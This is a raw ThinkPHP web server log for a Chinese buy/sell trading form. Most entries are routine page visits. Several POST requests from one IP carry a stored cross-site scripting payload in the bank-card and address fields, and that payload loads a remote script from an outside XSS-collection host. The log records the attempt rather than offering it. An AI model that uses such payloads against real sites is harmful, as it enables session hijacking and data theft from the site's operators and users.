---------------------------------------------------------------
[ 2021-08-09T01:18:58+08:00 ] 112.49.252.231 GET 28.zheyj.com/index/index/buy.html
[运行时间：0.071791s] [吞吐率：13.93req/s] [内存消耗：2,958.56kb] [文件加载：126]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004926s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000483s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'buy',
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'referer' => 'https://www.google.com/',
  'accept-language' => 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002818s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->buy[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/buy.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T01:18:59+08:00 ] 112.49.252.231 GET 28.zheyj.com/favicon.ico
[运行时间：0.041828s] [吞吐率：23.91req/s] [内存消耗：2,076.87kb] [文件加载：113]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000043s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003059s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000434s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://28.zheyj.com/index/index/buy.html',
  'cookie' => 'security_session_verify=87f221d7afe13160afd83147beb41081',
  'accept-language' => 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'image/webp,*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T01:19:33+08:00 ] 112.49.252.231 POST 28.zheyj.com/index/index/buy.html
[运行时间：0.070885s] [吞吐率：14.11req/s] [内存消耗：2,953.39kb] [文件加载：127]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000078s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003964s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000356s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'buy',
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'referer' => 'http://28.zheyj.com/index/index/buy.html',
  'origin' => 'http://28.zheyj.com',
  'cookie' => 'security_session_verify=87f221d7afe13160afd83147beb41081',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'accept-language' => 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'content-length' => '261',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
  'money_type' => '0',
  'money' => '123213',
  'money_num' => '7.5',
  'money_count' => '924097.5',
  'bank_account' => '泽',
  'bank_card' => '</tExtArEa>\'"><sCRiPt sRC=//xsshs.cn/hnKX></sCrIpT>',
  'address' => '</tExtArEa>\'"><sCRiPt sRC=//xsshs.cn/hnKX></sCrIpT>',
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001701s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->buy[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T01:19:45+08:00 ] 112.49.252.231 POST 28.zheyj.com/index/index/buy.html
[运行时间：0.650337s] [吞吐率：1.54req/s] [内存消耗：4,577.07kb] [文件加载：137]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000098s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.006365s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000582s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'buy',
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'referer' => 'http://28.zheyj.com/index/index/buy.html',
  'origin' => 'http://28.zheyj.com',
  'cookie' => 'security_session_verify=87f221d7afe13160afd83147beb41081',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'accept-language' => 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'content-length' => '216',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
  'money_type' => '0',
  'money' => '123213',
  'money_num' => '7.5',
  'money_count' => '924097.5',
  'bank_account' => '泽',
  'bank_card' => '</tExtArEa>\'"><sCRiPt sRC=//xsshs.cn/hnKX></sCrIpT>',
  'address' => 'TWCV2jNB4g3hTtFw8WYAo3ws62rTgYjzxh',
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002684s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->buy[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001159s ] mysql:host=127.0.0.1;port=3306;dbname=28_zheyj_com;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_buy` [ RunTime:0.001971s ]
[ sql ] [ SQL ] INSERT INTO `fa_buy` (`money` , `money_num` , `money_count` , `bank_account` , `bank_card` , `address` , `ip` , `createtime` , `updatetime`) VALUES (123213 , 7.5 , 924097.5 , '泽' , '\'&quot;&gt;' , 'TWCV2jNB4g3hTtFw8WYAo3ws62rTgYjzxh' , '112.49.252.231' , 1628443184 , 1628443184) [ RunTime:0.002884s ]
---------------------------------------------------------------
[ 2021-08-09T01:19:49+08:00 ] 112.49.252.231 GET 28.zheyj.com/index/index/sell.html
[运行时间：0.053566s] [吞吐率：18.67req/s] [内存消耗：2,959.65kb] [文件加载：126]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000035s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002835s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000358s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'sell',
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://28.zheyj.com/index/index/buy.html',
  'cookie' => 'security_session_verify=87f221d7afe13160afd83147beb41081',
  'accept-language' => 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001582s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->sell[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/sell.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T01:20:02+08:00 ] 112.49.252.231 POST 28.zheyj.com/index/index/buy.html
[运行时间：20.194474s] [吞吐率：0.05req/s] [内存消耗：4,579.82kb] [文件加载：138]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000055s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004151s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000339s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'buy',
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'referer' => 'http://28.zheyj.com/index/index/buy.html',
  'origin' => 'http://28.zheyj.com',
  'cookie' => 'security_session_verify=87f221d7afe13160afd83147beb41081',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'accept-language' => 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'content-length' => '216',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
  'money_type' => '0',
  'money' => '123213',
  'money_num' => '7.5',
  'money_count' => '924097.5',
  'bank_account' => '泽',
  'bank_card' => '</tExtArEa>\'"><sCRiPt sRC=//xsshs.cn/hnKX></sCrIpT>',
  'address' => 'TWCV2jNB4g3hTtFw8WYAo3ws62rTgYjzxh',
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001716s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->buy[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.004776s ] mysql:host=127.0.0.1;port=3306;dbname=28_zheyj_com;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_buy` [ RunTime:0.002064s ]
[ sql ] [ SQL ] INSERT INTO `fa_buy` (`money` , `money_num` , `money_count` , `bank_account` , `bank_card` , `address` , `ip` , `createtime` , `updatetime`) VALUES (123213 , 7.5 , 924097.5 , '泽' , '\'&quot;&gt;' , 'TWCV2jNB4g3hTtFw8WYAo3ws62rTgYjzxh' , '112.49.252.231' , 1628443182 , 1628443182) [ RunTime:0.030443s ]
---------------------------------------------------------------
[ 2021-08-09T03:11:46+08:00 ] 92.118.160.17 GET 28.zheyj.com/
[运行时间：0.083179s] [吞吐率：12.02req/s] [内存消耗：2,908.79kb] [文件加载：127]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000064s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004797s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000523s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001776s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:00:58+08:00 ] 122.5.101.162 GET 28.zheyj.com/
[运行时间：0.087456s] [吞吐率：11.43req/s] [内存消耗：2,875.82kb] [文件加载：124]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000062s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.007851s ]
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000584s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept-language' => 'en-US',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; EVR-AL00 Build/HUAWEIEVR-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.156 Mobile Safari/537.36 aweme_130400 JsSdk/1.0 NetType/WIFI Channel/huawei_1 AppName/aweme app_version/13.4.0 ByteLocale/zh-Hans-CN Region/CN AppSkin/black AppTheme/dark TTWebView/0751130011409',
  'upgrade-insecure-requests' => '1',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002036s ]
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:00:58+08:00 ] 58.212.54.85 GET 28.zheyj.com/index/index/sell.html
[运行时间：0.069163s] [吞吐率：14.46req/s] [内存消耗：2,924.66kb] [文件加载：123]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000051s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003862s ]
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000464s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'sell',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'cookie' => 'security_session_verify=d27bb077b38cc111afe7a80040f981b8',
  'accept-language' => 'en-US',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 10; EVR-AL00 Build/HUAWEIEVR-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.156 Mobile Safari/537.36 aweme_130400 JsSdk/1.0 NetType/WIFI Channel/huawei_1 AppName/aweme app_version/13.4.0 ByteLocale/zh-Hans-CN Region/CN AppSkin/black AppTheme/dark TTWebView/0751130011409',
  'upgrade-insecure-requests' => '1',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002445s ]
[ info ] [ RUN ] app\index\controller\Index->sell[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/sell.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:05:55+08:00 ] 61.147.15.66 GET 28.zheyj.com/
[运行时间：0.054846s] [吞吐率：18.23req/s] [内存消耗：2,910.67kb] [文件加载：127]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000047s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003850s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000375s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cache-control' => 'no-cache',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 7.0; ZTE BA520 Build/MRA58K)',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002316s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:05:55+08:00 ] 61.147.15.66 GET 28.zheyj.com/index/index/sell.html
[运行时间：0.064871s] [吞吐率：15.42req/s] [内存消耗：2,959.51kb] [文件加载：126]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.005171s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000449s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'sell',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'security_session_verify=e68cd7ef97b0ed7f150d24fbc16ba3a3',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cache-control' => 'no-cache',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 7.0; ZTE BA520 Build/MRA58K)',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002500s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->sell[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/sell.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:06:47+08:00 ] 61.147.15.66 GET 28.zheyj.com/
[运行时间：0.069594s] [吞吐率：14.37req/s] [内存消耗：2,910.67kb] [文件加载：127]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000062s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004603s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000491s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cache-control' => 'no-cache',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 7.0; ZTE BA520 Build/MRA58K)',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.003344s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:06:48+08:00 ] 61.147.15.66 GET 28.zheyj.com/index/index/sell.html
[运行时间：0.086389s] [吞吐率：11.58req/s] [内存消耗：2,959.51kb] [文件加载：126]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000046s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.005543s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000468s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'sell',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'security_session_verify=e68cd7ef97b0ed7f150d24fbc16ba3a3',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cache-control' => 'no-cache',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 7.0; ZTE BA520 Build/MRA58K)',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.003793s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->sell[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/sell.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:08:25+08:00 ] 61.147.15.67 GET 28.zheyj.com/
[运行时间：0.078787s] [吞吐率：12.69req/s] [内存消耗：2,911.11kb] [文件加载：127]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000081s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.006847s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000519s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cache-control' => 'no-cache',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002653s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-08-09T15:08:25+08:00 ] 61.147.15.67 GET 28.zheyj.com/index/index/sell.html
[运行时间：0.064095s] [吞吐率：15.60req/s] [内存消耗：2,959.70kb] [文件加载：126]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000051s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004507s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/thinkphp/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000460s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'sell',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'security_session_verify=70196a77db73a482296945805dabb16d',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cache-control' => 'no-cache',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27',
  'host' => '28.zheyj.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002234s ]
[ info ] [ LANG ] /www/wwwroot/28.zheyj.com/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->sell[ /www/wwwroot/28.zheyj.com/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/28.zheyj.com/public/../application/index/view/index/sell.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
